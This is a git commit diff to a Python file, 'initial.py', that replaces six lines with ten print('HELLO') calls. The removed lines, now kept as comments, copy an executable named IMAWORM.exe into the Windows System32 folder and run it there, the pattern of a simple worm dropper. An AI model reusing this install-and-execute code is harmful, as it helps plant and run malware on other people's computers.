d1e68138b29e6a5b0219fa6fa42cfdcb5b35c4f4
RCDelta <104479252+RCDelta@users.noreply.github.com>
2024-04-26 18:30:07 -0400

    Update initial.py

--- initial.py
+++ initial.py
@@ -1,6 +1,17 @@
-import os
-import shutil
-cwd = os.getcwd()
-shutil.copy(cwd+"/IMAWORM.exe", "/Windows/System32")
-os.chdir("/Windows/System32")
-os.system(".\IMAWORM.exe")
+# import os
+# import shutil
+# cwd = os.getcwd()
+# shutil.copy(cwd+"/IMAWORM.exe", "/Windows/System32")
+# os.chdir("/Windows/System32")
+# os.system(".\IMAWORM.exe")
+print("HELLO")
+print("HELLO")
+print("HELLO")
+print("HELLO")
+print("HELLO")
+print("HELLO")
+print("HELLO")
+print("HELLO")
+print("HELLO")
+print("HELLO")
+
